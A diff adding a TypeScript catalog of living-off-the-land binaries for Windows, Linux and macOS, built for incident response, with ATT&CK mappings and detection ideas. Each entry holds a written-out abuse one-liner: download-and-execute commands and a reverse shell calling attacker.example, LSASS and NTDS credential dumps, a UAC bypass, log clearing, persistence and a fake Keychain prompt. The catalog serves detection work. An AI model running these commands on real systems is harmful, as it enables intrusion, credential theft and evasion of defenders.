@@ -1,0 +1,523 @@
+/**
+ * Living-off-the-land binary catalog.
+ *
+ * Combines highlights from LOLBAS (Windows) and GTFOBins (Unix) into a
+ * single, ATT&CK-cross-linked dataset. Curated for incident-response
+ * lookups: each entry includes the canonical abuse one-liner, the kill-
+ * chain phase it tends to appear in, and a detection idea you can wire
+ * into a SIEM rule.
+ */
+
+export type Platform = 'windows' | 'linux' | 'macos';
+
+export type Category =
+  | 'execute'
+  | 'download'
+  | 'upload'
+  | 'persistence'
+  | 'discovery'
+  | 'credential-access'
+  | 'lateral-movement'
+  | 'defense-evasion'
+  | 'priv-esc';
+
+export interface LolbinEntry {
+  id: string;
+  binary: string;
+  platforms: Platform[];
+  category: Category;
+  /** Short headline of the abuse. */
+  technique: string;
+  /** One-liner showing the abuse. Sanitised but realistic. */
+  example: string;
+  /** ATT&CK technique IDs this primarily maps to. */
+  attack: string[];
+  /** What the legitimate use of this binary is (so analysts can baseline). */
+  legit: string;
+  /** Detection idea. */
+  detection: string;
+  /** Source — LOLBAS / GTFOBins / vendor advisory. */
+  source: 'LOLBAS' | 'GTFOBins' | 'LOOBins' | 'WTFBins';
+  /** Reference URL (may be the catalog page). */
+  url: string;
+}
+
+export const LOLBINS: LolbinEntry[] = [
+  // ── Windows: execute ──────────────────────────────────────────────────
+  {
+    id: 'mshta-remote',
+    binary: 'mshta.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: 'Run remote HTA / VBS / JS code',
+    example: 'mshta.exe https://attacker.example/payload.hta',
+    attack: ['T1218.005'],
+    legit: 'Microsoft HTML Application host — historically used for IE-era apps.',
+    detection: 'Alert on mshta.exe with a network arg or unusual parent (Office, browser, mail client).',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Mshta/',
+  },
+  {
+    id: 'rundll32-js',
+    binary: 'rundll32.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: 'Run JavaScript via rundll32',
+    example:
+      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("calc.exe")',
+    attack: ['T1218.011'],
+    legit: 'Loads and runs DLL exports — used legitimately by every Windows component.',
+    detection: 'rundll32 with javascript:, .dll,EntryPoint where path is non-system, or no arg at all.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/',
+  },
+  {
+    id: 'regsvr32-squiblydoo',
+    binary: 'regsvr32.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: '"Squiblydoo" — register remote scriptlet, run code',
+    example: 'regsvr32 /s /u /n /i:https://attacker.example/file.sct scrobj.dll',
+    attack: ['T1218.010'],
+    legit: 'Registers / unregisters DLLs and OCXs for COM.',
+    detection: 'regsvr32 with /i: pointing to http(s):// or a non-system path, or scrobj.dll on cmdline.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/',
+  },
+  {
+    id: 'msbuild-inline-task',
+    binary: 'MSBuild.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: 'Inline-task / XML-payload build that compiles + runs C#',
+    example: 'MSBuild.exe payload.csproj',
+    attack: ['T1127.001'],
+    legit: 'Microsoft build engine; ships with Visual Studio and the .NET SDK.',
+    detection: 'MSBuild on a host without a dev profile, or run from %TEMP% / user profile paths.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Msbuild/',
+  },
+  {
+    id: 'installutil-uninstall',
+    binary: 'InstallUtil.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: 'Run .NET assembly via /U (uninstall) without admin',
+    example: 'InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe',
+    attack: ['T1218.004'],
+    legit: 'Installs / uninstalls .NET assemblies as Windows services.',
+    detection: 'InstallUtil with /U + a non-system .exe path, often under %TEMP%.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/InstallUtil/',
+  },
+  {
+    id: 'wmic-process-create',
+    binary: 'wmic.exe',
+    platforms: ['windows'],
+    category: 'lateral-movement',
+    technique: 'Remote process creation via WMI',
+    example: 'wmic /node:"target.example" process call create "cmd /c whoami > c:\\out.txt"',
+    attack: ['T1047'],
+    legit: 'WMI command-line; deprecated but still present on most Windows installs.',
+    detection:
+      'wmic with /node: and process call create — monitor 4688 (auditpol on subjects of WMI) and Sysmon EID 1.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Wmic/',
+  },
+  {
+    id: 'certutil-download',
+    binary: 'certutil.exe',
+    platforms: ['windows'],
+    category: 'download',
+    technique: 'Download arbitrary file (legacy "url cache" trick)',
+    example: 'certutil.exe -urlcache -split -f https://attacker.example/payload.exe payload.exe',
+    attack: ['T1105'],
+    legit: 'Certificate management.',
+    detection: 'certutil with -urlcache / -decode / -urlcache -f anywhere outside enterprise PKI workflows.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/',
+  },
+  {
+    id: 'bitsadmin-download',
+    binary: 'bitsadmin.exe',
+    platforms: ['windows'],
+    category: 'download',
+    technique: 'Background-Intelligent-Transfer-Service download with auto-resume',
+    example: 'bitsadmin /transfer job /priority high https://attacker.example/x.exe %TEMP%\\x.exe',
+    attack: ['T1197'],
+    legit: 'Windows Update, SCCM and other deferred-bandwidth services.',
+    detection: 'bitsadmin /transfer or /create from non-system parents, or to non-corporate URLs.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/',
+  },
+  {
+    id: 'powershell-iex',
+    binary: 'powershell.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: 'Download + execute via IEX',
+    example:
+      'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'https://attacker.example/p.ps1\')"',
+    attack: ['T1059.001'],
+    legit: 'Admin scripting and Configuration as Code.',
+    detection: 'PS with -nop / -enc / -w hidden, or AMSI.ScanContent failures (Defender Event 1116).',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Powershell/',
+  },
+  {
+    id: 'cmstp-inf',
+    binary: 'cmstp.exe',
+    platforms: ['windows'],
+    category: 'execute',
+    technique: 'Microsoft Connection Manager INF abuse',
+    example: 'cmstp.exe /au /s c:\\public\\evil.inf',
+    attack: ['T1218.003'],
+    legit: 'Installer for Connection Manager service profiles (legacy VPN / RAS).',
+    detection: 'cmstp.exe spawning child processes, or .inf paths outside of %WINDIR%.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Cmstp/',
+  },
+
+  // ── Windows: persistence ──────────────────────────────────────────────
+  {
+    id: 'schtasks-persist',
+    binary: 'schtasks.exe',
+    platforms: ['windows'],
+    category: 'persistence',
+    technique: 'Create scheduled task at logon / on-boot',
+    example: 'schtasks /Create /SC ONLOGON /TN updater /TR "powershell -nop -f c:\\users\\public\\u.ps1" /RL HIGHEST',
+    attack: ['T1053.005'],
+    legit: 'Windows scheduled-task management.',
+    detection: '4698 (task created); flag where Task name is generic ("update", "checker") or path is %PUBLIC%/%TEMP%.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Schtasks/',
+  },
+  {
+    id: 'reg-run-key',
+    binary: 'reg.exe',
+    platforms: ['windows'],
+    category: 'persistence',
+    technique: 'Add Run / RunOnce autostart',
+    example:
+      'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "c:\\users\\public\\u.exe" /f',
+    attack: ['T1547.001'],
+    legit: 'Registry edits.',
+    detection: 'Sysmon EID 12/13/14 on Run/RunOnce; flag values pointing at user-writable paths.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Reg/',
+  },
+  {
+    id: 'sc-service',
+    binary: 'sc.exe',
+    platforms: ['windows'],
+    category: 'persistence',
+    technique: 'Create / modify a service for persistence',
+    example: 'sc create updater binPath= "cmd /c c:\\users\\public\\u.exe" start= auto',
+    attack: ['T1543.003'],
+    legit: 'Service control.',
+    detection: '7045 service install; check binPath for non-system locations and unsigned binaries.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Sc/',
+  },
+
+  // ── Windows: defense-evasion ──────────────────────────────────────────
+  {
+    id: 'ntdsutil-dump',
+    binary: 'ntdsutil.exe',
+    platforms: ['windows'],
+    category: 'credential-access',
+    technique: 'Dump NTDS.dit (domain hashes)',
+    example: 'ntdsutil "ac i ntds" "ifm" "create full c:\\temp\\ntds" q q',
+    attack: ['T1003.003'],
+    legit: 'Active Directory snapshot / IFM media creation — domain admin only.',
+    detection: 'ntdsutil running on a non-DC, or any host with arguments mentioning "ifm".',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Ntdsutil/',
+  },
+  {
+    id: 'comsvcs-dump',
+    binary: 'comsvcs.dll',
+    platforms: ['windows'],
+    category: 'credential-access',
+    technique: 'LSASS minidump via MiniDump export',
+    example: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> c:\\temp\\lsass.dmp full',
+    attack: ['T1003.001'],
+    legit: 'COM+ services library; MiniDump export shipped for debugging.',
+    detection: 'rundll32 referencing comsvcs.dll + MiniDump on the cmdline; LSASS PID lookup with ProcessAccess.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Libraries/Comsvcs/',
+  },
+  {
+    id: 'attrib-hidden',
+    binary: 'attrib.exe',
+    platforms: ['windows'],
+    category: 'defense-evasion',
+    technique: 'Hide file with system / hidden attribute',
+    example: 'attrib +s +h c:\\users\\public\\u.exe',
+    attack: ['T1564.001'],
+    legit: 'File-attribute editing.',
+    detection: 'attrib invocations that touch executables in user-writable paths.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Attrib/',
+  },
+  {
+    id: 'fodhelper-uac',
+    binary: 'fodhelper.exe',
+    platforms: ['windows'],
+    category: 'priv-esc',
+    technique: 'UAC bypass via auto-elevated registry hijack',
+    example:
+      'reg add "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command" /d "c:\\evil.exe" /f & fodhelper.exe',
+    attack: ['T1548.002'],
+    legit: 'Features-on-demand helper; auto-elevates without UAC prompt.',
+    detection: 'Sysmon registry write on HKCU\\Software\\Classes\\ms-settings followed by fodhelper.exe execution.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/',
+  },
+  {
+    id: 'wevtutil-clear',
+    binary: 'wevtutil.exe',
+    platforms: ['windows'],
+    category: 'defense-evasion',
+    technique: 'Clear event log',
+    example: 'wevtutil cl Security',
+    attack: ['T1070.001'],
+    legit: 'Event-log query/clear; legitimate during forensics drills.',
+    detection: '1102 (audit log cleared) and 104 (system log cleared).',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Wevtutil/',
+  },
+
+  // ── Windows: discovery ────────────────────────────────────────────────
+  {
+    id: 'nltest-dclist',
+    binary: 'nltest.exe',
+    platforms: ['windows'],
+    category: 'discovery',
+    technique: 'Enumerate domain trusts and DCs',
+    example: 'nltest /domain_trusts /all_trusts',
+    attack: ['T1482'],
+    legit: 'AD diagnostics.',
+    detection: 'nltest under user / interactive shells; correlate with later AS-REP / Kerberoasting traffic.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Nltest/',
+  },
+  {
+    id: 'whoami-priv',
+    binary: 'whoami.exe',
+    platforms: ['windows'],
+    category: 'discovery',
+    technique: 'Show current user / privileges / groups',
+    example: 'whoami /all',
+    attack: ['T1033'],
+    legit: 'Identity introspection.',
+    detection: 'Cluster of whoami / net user / nltest in <60s on a single host = recon burst.',
+    source: 'LOLBAS',
+    url: 'https://lolbas-project.github.io/lolbas/Binaries/Whoami/',
+  },
+
+  // ── Linux / GTFOBins ──────────────────────────────────────────────────
+  {
+    id: 'curl-suid',
+    binary: 'curl',
+    platforms: ['linux', 'macos'],
+    category: 'download',
+    technique: 'File download (and read SUID files when curl has caps)',
+    example: 'curl https://attacker.example/p.sh -o /tmp/p.sh && bash /tmp/p.sh',
+    attack: ['T1105'],
+    legit: 'Universal HTTP client.',
+    detection: 'curl from non-interactive shells, /tmp paths, or to fresh-NOD domains.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/curl/',
+  },
+  {
+    id: 'wget-suid',
+    binary: 'wget',
+    platforms: ['linux'],
+    category: 'download',
+    technique: 'Download + execute',
+    example: 'wget -qO- https://attacker.example/p.sh | bash',
+    attack: ['T1105'],
+    legit: 'HTTP retriever.',
+    detection: 'wget output piped to a shell; auditd execve where parent is wget.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/wget/',
+  },
+  {
+    id: 'find-exec',
+    binary: 'find',
+    platforms: ['linux', 'macos'],
+    category: 'execute',
+    technique: 'Run arbitrary command via -exec',
+    example: 'find . -exec /bin/sh \\; -quit',
+    attack: ['T1059.004'],
+    legit: 'Filesystem search.',
+    detection: 'auditd: find with -exec spawning a shell; rare in service accounts.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/find/',
+  },
+  {
+    id: 'awk-shell',
+    binary: 'awk',
+    platforms: ['linux', 'macos'],
+    category: 'execute',
+    technique: 'Spawn shell from awk system()',
+    example: 'awk \'BEGIN {system("/bin/sh")}\'',
+    attack: ['T1059.004'],
+    legit: 'Text processing.',
+    detection: 'auditd: awk producing a child shell; pair with TTY allocation events.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/awk/',
+  },
+  {
+    id: 'python-shell',
+    binary: 'python3',
+    platforms: ['linux', 'macos'],
+    category: 'execute',
+    technique: 'pty.spawn shell upgrade',
+    example: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
+    attack: ['T1059.006'],
+    legit: 'Scripting.',
+    detection: 'python -c on a webserver / service account, or pty.spawn signature in cmdline.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/python/',
+  },
+  {
+    id: 'bash-tcp',
+    binary: 'bash',
+    platforms: ['linux', 'macos'],
+    category: 'execute',
+    technique: 'Reverse TCP shell via /dev/tcp',
+    example: 'bash -i >& /dev/tcp/attacker.example/4444 0>&1',
+    attack: ['T1059.004'],
+    legit: 'Default shell.',
+    detection: 'bash with /dev/tcp/ in cmdline; egress to non-corp IPs from non-egress hosts.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/bash/',
+  },
+  {
+    id: 'sudo-edit-suid',
+    binary: 'sudoedit',
+    platforms: ['linux'],
+    category: 'priv-esc',
+    technique: 'CVE-2023-22809 — env var EDITOR / VISUAL hijack',
+    example: 'EDITOR="vim -- /etc/shadow" sudoedit /etc/anything',
+    attack: ['T1548.003'],
+    legit: 'Sudo-managed file editing.',
+    detection: 'auditd: sudoedit with EDITOR / VISUAL containing "--" in env.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/sudoedit/',
+  },
+  {
+    id: 'crontab-persist',
+    binary: 'crontab',
+    platforms: ['linux', 'macos'],
+    category: 'persistence',
+    technique: 'User crontab persistence',
+    example: '(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.x") | crontab -',
+    attack: ['T1053.003'],
+    legit: 'Per-user scheduled tasks.',
+    detection: 'auditd watch on /var/spool/cron/* + EXECVE crontab from non-interactive sessions.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/crontab/',
+  },
+  {
+    id: 'ssh-suid',
+    binary: 'ssh',
+    platforms: ['linux', 'macos'],
+    category: 'lateral-movement',
+    technique: 'Lateral movement using stolen private keys',
+    example: 'ssh -i ~/.ssh/id_rsa user@target.example "uname -a"',
+    attack: ['T1021.004'],
+    legit: 'Remote access.',
+    detection: 'ssh from service accounts; ssh outbound to non-corp ranges from production hosts.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/ssh/',
+  },
+  {
+    id: 'tar-checkpoint',
+    binary: 'tar',
+    platforms: ['linux', 'macos'],
+    category: 'execute',
+    technique: 'Run command via --checkpoint-action',
+    example: 'tar cf /tmp/x /tmp --checkpoint=1 --checkpoint-action=exec=/bin/sh',
+    attack: ['T1059.004'],
+    legit: 'Archiver.',
+    detection: '--checkpoint-action=exec= in tar cmdline = anomaly.',
+    source: 'GTFOBins',
+    url: 'https://gtfobins.github.io/gtfobins/tar/',
+  },
+
+  // ── macOS: LOOBins highlights ─────────────────────────────────────────
+  {
+    id: 'osascript-keychain',
+    binary: 'osascript',
+    platforms: ['macos'],
+    category: 'credential-access',
+    technique: 'Prompt user for password via fake Keychain dialog',
+    example:
+      'osascript -e \'display dialog "Keychain wants to use the login keychain." default answer "" with hidden answer\'',
+    attack: ['T1056.002'],
+    legit: 'AppleScript runner.',
+    detection: 'osascript with display dialog containing "password" or "keychain" — flag as user-input prompt.',
+    source: 'LOOBins',
+    url: 'https://www.loobins.io/binaries/osascript/',
+  },
+  {
+    id: 'launchctl-persist',
+    binary: 'launchctl',
+    platforms: ['macos'],
+    category: 'persistence',
+    technique: 'Persistence via Launch Agent / Daemon',
+    example: 'launchctl load -w ~/Library/LaunchAgents/com.attacker.sync.plist',
+    attack: ['T1543.001'],
+    legit: 'macOS launchd control.',
+    detection: 'New plist files in ~/Library/LaunchAgents or /Library/LaunchDaemons; FSEvents + telemetry.',
+    source: 'LOOBins',
+    url: 'https://www.loobins.io/binaries/launchctl/',
+  },
+  {
+    id: 'security-keychain-find',
+    binary: 'security',
+    platforms: ['macos'],
+    category: 'credential-access',
+    technique: 'Dump Keychain entries from CLI',
+    example: 'security find-generic-password -s "AccountName" -w',
+    attack: ['T1555.001'],
+    legit: 'macOS keychain CLI.',
+    detection: 'security with find-* / dump-keychain by non-admin processes.',
+    source: 'LOOBins',
+    url: 'https://www.loobins.io/binaries/security/',
+  },
+  {
+    id: 'sudo-touchid-bypass',
+    binary: 'sudo',
+    platforms: ['macos'],
+    category: 'priv-esc',
+    technique: 'Cached sudo session abuse for silent escalation',
+    example: 'sudo -l; sudo -E /usr/bin/whoami # within timeout window',
+    attack: ['T1548.003'],
+    legit: 'Standard sudo.',
+    detection: 'auditd / OpenBSM: sudo invocations from background processes within sudo timestamp window.',
+    source: 'LOOBins',
+    url: 'https://www.loobins.io/',
+  },
+];
+
+export const LOLBIN_CATEGORIES: { id: Category; label: string }[] = [
+  { id: 'execute', label: 'Execute' },
+  { id: 'download', label: 'Download' },
+  { id: 'upload', label: 'Upload' },
+  { id: 'persistence', label: 'Persistence' },
+  { id: 'discovery', label: 'Discovery' },
+  { id: 'credential-access', label: 'Credential access' },
+  { id: 'lateral-movement', label: 'Lateral movement' },
+  { id: 'defense-evasion', label: 'Defense evasion' },
+  { id: 'priv-esc', label: 'Privilege escalation' },
+];
+
+export const LOLBIN_PLATFORMS: { id: Platform; label: string }[] = [
+  { id: 'windows', label: 'Windows' },
+  { id: 'linux', label: 'Linux' },
+  { id: 'macos', label: 'macOS' },
+];
